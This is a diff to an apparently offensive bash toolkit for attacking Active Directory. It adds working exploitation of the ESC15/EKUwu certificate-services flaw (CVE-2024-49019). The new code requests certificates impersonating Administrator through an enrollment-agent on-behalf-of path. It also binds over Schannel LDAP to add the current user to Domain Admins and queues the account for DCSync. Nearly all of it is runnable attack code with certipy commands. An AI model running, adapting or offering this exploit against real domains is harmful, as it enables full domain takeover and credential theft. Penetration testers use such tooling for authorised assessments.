@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.17.2"
+readonly VERSION="1.17.3"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1888,6 +1888,90 @@ _adcs_restore_enroller() {   # _adcs_restore_enroller <space-separated SIDs>
     return 1
 }
 
+# Pick an enabled template to use as the ESC15 scenario-B ON-BEHALF-OF target:
+# it must build its subject FROM AD (Enrollee Supplies Subject = False) and carry
+# the Client Authentication EKU, so the admin cert we mint through it is genuinely
+# PKINIT-capable. Prefer the stock 'User' template; else any client-auth one.
+_adcs_clientauth_tpl() {                 # _adcs_clientauth_tpl <find-output>
+    awk 'BEGIN{IGNORECASE=1}
+        /Template Name/{ if(name!="" && ca && !ess) print name; name=$0; sub(/.*:[[:space:]]*/,"",name); ca=0; ess=0 }
+        /Client Authentication.*:[[:space:]]*True/{ ca=1 }
+        /Enrollee Supplies Subject.*:[[:space:]]*True/{ ess=1 }
+        END{ if(name!="" && ca && !ess) print name }' <<<"$1" | sed 's/[[:space:]]*$//' | sort -u
+}
+
+# EKUwu has NO single "request as admin" call: the v1 cert inherits the template's
+# EKU (Server Authentication), so PKINIT rejects it ("certificate is not valid for
+# client authentication") — that's the error you hit. Editing the template (ESC4)
+# is NOT the fix here (the enrollee almost never has WriteProperty on it; only DA/EA
+# do). EKUwu needs no template change at all. Two real abuses, tried in order:
+#   B) Enrollment Agent — inject the 'Certificate Request Agent' application policy
+#      into the v1 cert, then use it to enrol On-Behalf-Of Administrator against a
+#      normal client-auth (User) template → that admin cert IS PKINIT-capable → NT hash.
+#   A) Schannel — inject 'Client Authentication' application policy + -upn/-sid admin;
+#      PKINIT still can't use a Server-Auth EKU, but an LDAPS Schannel bind CAN, so we
+#      bind as Administrator and add the current principal to Domain Admins, then re-queue.
+_adcs_esc15_exploit() {                  # _adcs_esc15_exploit <ca> <v1tpl> <obo_clientauth_tpl>
+    local ca="$1" tpl="$2" obo="$3"
+    _adcs_setauth
+    [[ -z "$_ADCS_SID" ]] && _ADCS_SID="$(_adcs_admin_sid)"
+    confirm "  ESC15: abuse v1 template '$tpl' to impersonate Administrator (EKUwu)?" || return 1
+
+    # ---- Scenario B: enrollment agent → on-behalf-of (yields a PKINIT cert + hash)
+    if [[ -n "$obo" ]]; then
+        info "  ESC15-B: minting a Certificate-Request-Agent cert from '$tpl'…"
+        run "certipy req … -template $tpl -application-policies 'Certificate Request Agent'"
+        local oa; oa=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" \
+            certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
+            -application-policies 'Certificate Request Agent' \
+            -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$oa" | tee -a "$LOGFILE"
+        local agent; agent=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$oa" | tail -1 | xargs -r basename)
+        if [[ -n "$agent" && -f "$OUTDIR/$agent" ]]; then
+            info "  ESC15-B: enrolling On-Behalf-Of Administrator via '$obo'…"
+            run "certipy req … -template $obo -pfx $agent -on-behalf-of '${DOMAIN%%.*}\\administrator'"
+            local ob; ob=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" \
+                certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$obo" -pfx "$agent" \
+                -on-behalf-of "${DOMAIN%%.*}\\administrator" \
+                -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$ob" | tee -a "$LOGFILE"
+            local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$ob" | tail -1 | xargs -r basename)
+            _adcs_pwn_pfx "$pfx" "ESC15(EKUwu/agent)" && return 0
+        else
+            warn "  ESC15-B: no enrollment-agent cert issued (template may forbid the agent app-policy)"
+        fi
+    fi
+
+    # ---- Scenario A: Schannel LDAP (cert keeps Server-Auth EKU → no PKINIT) ---------
+    info "  ESC15-A: requesting a Client-Authentication cert as Administrator (Schannel path)…"
+    local sidargs=(); [[ -n "$_ADCS_SID" ]] && sidargs=(-sid "$_ADCS_SID")
+    run "certipy req … -template $tpl -upn administrator@$DOMAIN -application-policies 'Client Authentication'"
+    local ra; ra=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" \
+        certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
+        -upn "administrator@${DOMAIN}" "${sidargs[@]}" -application-policies 'Client Authentication' \
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$ra" | tee -a "$LOGFILE"
+    local apfx; apfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$ra" | tail -1 | xargs -r basename)
+    [[ -z "$apfx" || ! -f "$OUTDIR/$apfx" ]] && { warn "  ESC15-A: no certificate issued from '$tpl'"; return 1; }
+    # PKINIT can't use a Server-Auth EKU cert → bind over Schannel as Administrator
+    # and add the CURRENT principal to Domain Admins (driven non-interactively on
+    # the ldap-shell's stdin), then re-queue it so the engine DCSyncs as DA.
+    local grp="Domain Admins"
+    info "  ESC15-A: PKINIT can't use a Server-Auth EKU → Schannel LDAP as Administrator (add $USER → '$grp')…"
+    run "certipy auth -pfx $apfx -dc-ip $DC_IP -ldap-shell  « add_user_to_group $USER '$grp'"
+    local lout; lout=$( cd "$OUTDIR" && printf 'add_user_to_group %s "%s"\nexit\n' "$USER" "$grp" | \
+        "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy auth -pfx "$apfx" -dc-ip "$DC_IP" -ldap-shell 2>&1 ); echo "$lout" | tee -a "$LOGFILE"
+    if grep -qiE 'added .*to|successfully|adding user|modify(ied)? .*succe' <<<"$lout"; then
+        rb_record "ESC15-A: added $USER to '$grp' via Schannel LDAP" \
+                  "echo 'Manual: remove $USER from $grp (bloodyAD remove groupMember \"$grp\" $USER)'"
+        loot "★★★ ESC15 (EKUwu/Schannel) → ${C_BOLD}${USER}${C_RESET} added to '${grp}' — re-queueing for DCSync"
+        note_cred_source "$USER" "ADCS ESC15 (EKUwu Schannel → Domain Admins)"
+        OWNED_GROUPS[${USER,,}]="Domain Admins"
+        unset "SEEN_CREDS[${USER,,}]"
+        queue_cred "$USER" "$PASS" "$HASH" "ESC15 (EKUwu Schannel → Domain Admins)"
+        return 0
+    fi
+    warn "  ESC15: Schannel LDAP didn't confirm the group change — finish manually: certipy auth -pfx $apfx -dc-ip $DC_IP -ldap-shell"
+    return 1
+}
+
 _adcs_esc15_blind() {
     local ca="$1"; have certipy || return 1
     _adcs_setauth
@@ -1896,10 +1980,8 @@ _adcs_esc15_blind() {
     local full; full=$( "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${_ADCS_AUTH[@]}" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" -stdout -enabled </dev/null 2>&1 )
     # ESC15 needs a SCHEMA-VERSION-1 template that lets the ENROLLEE SUPPLY THE
-    # SUBJECT — only then does our -upn administrator take effect (otherwise the
-    # cert is issued for us and is useless: "not valid for client authentication").
-    # v1 + ESS = WebServer/SubCA-class. Parsed dynamically — no hard-coded names.
-    # We don't pre-filter by enrolment rights (they can hide behind unresolved
+    # SUBJECT. v1 + ESS = WebServer/SubCA-class. Parsed dynamically — no hard-coded
+    # names. We don't pre-filter by enrolment rights (they can hide behind unresolved
     # SIDs); the certipy req itself is the real enrolment test (DENIED vs issued).
     local tpls; tpls=$(awk 'BEGIN{IGNORECASE=1}
         /Template Name/{ if(name!="" && v1 && ess) print name; name=$0; sub(/.*:[[:space:]]*/,"",name); v1=0; ess=0 }
@@ -1908,12 +1990,15 @@ _adcs_esc15_blind() {
         /EnrolleeSuppliesSubject/{ ess=1 }
         END{ if(name!="" && v1 && ess) print name }' <<<"$full" | sed 's/[[:space:]]*$//' | sort -u)
     [[ -z "$tpls" ]] && { info "  no v1 Enrollee-Supplies-Subject template → ESC15 not applicable here"; return 1; }
+    # The on-behalf-of target for scenario B (prefer the stock 'User' template).
+    local catpls; catpls=$(_adcs_clientauth_tpl "$full")
+    local obo; obo=$(grep -ixF 'User' <<<"$catpls" | head -1); [[ -z "$obo" ]] && obo=$(head -1 <<<"$catpls")
     local t n=0
     while IFS= read -r t; do
         [[ -z "$t" ]] && continue
         (( n++ >= 5 )) && break
-        loot "ESC15 candidate: v1+ESS template '${t}' → requesting an Administrator cert (EKUwu)"
-        _adcs_req_admin "$ca" "$t" "ESC15(EKUwu)" 1 -application-policies 'Client Authentication' && return 0
+        loot "ESC15 candidate: v1+ESS template '${t}' (EKUwu / CVE-2024-49019)"
+        _adcs_esc15_exploit "$ca" "$t" "$obo" && return 0
     done <<<"$tpls"
     # All v1+ESS templates were denied — the real enroller may be a DELETED account
     # whose SID is in the enrol ACE (certipy couldn't resolve it). Cross-reference
@@ -1949,8 +2034,9 @@ _abuse_adcs() {
         case "$esc" in
             ESC1|ESC2|ESC6)  _adcs_req_admin "$ca" "$tpl" "$esc" 1 && return 0 ;;   # SAN impersonation (+SID)
             ESC9|ESC10|ESC16) _adcs_req_admin "$ca" "$tpl" "$esc" 0 && return 0 ;;  # missing SID extension → UPN map
-            ESC15) [[ "$tpl" == "User" ]] && tpl="WebServer"
-                   _adcs_req_admin "$ca" "$tpl" "ESC15" 1 -application-policies 'Client Authentication' && return 0 ;;
+            ESC15) local _obo; _obo=$(_adcs_clientauth_tpl "$cout" | grep -ixF 'User' | head -1)
+                   [[ -z "$_obo" ]] && _obo=$(_adcs_clientauth_tpl "$cout" | head -1)
+                   _adcs_esc15_exploit "$ca" "$tpl" "$_obo" && return 0 ;;
             ESC3)  _adcs_esc3  "$ca" "$tpl" && return 0 ;;
             ESC4)  _adcs_esc4  "$ca" "$tpl" && return 0 ;;
             ESC7)  _adcs_esc7  "$ca"        && return 0 ;;
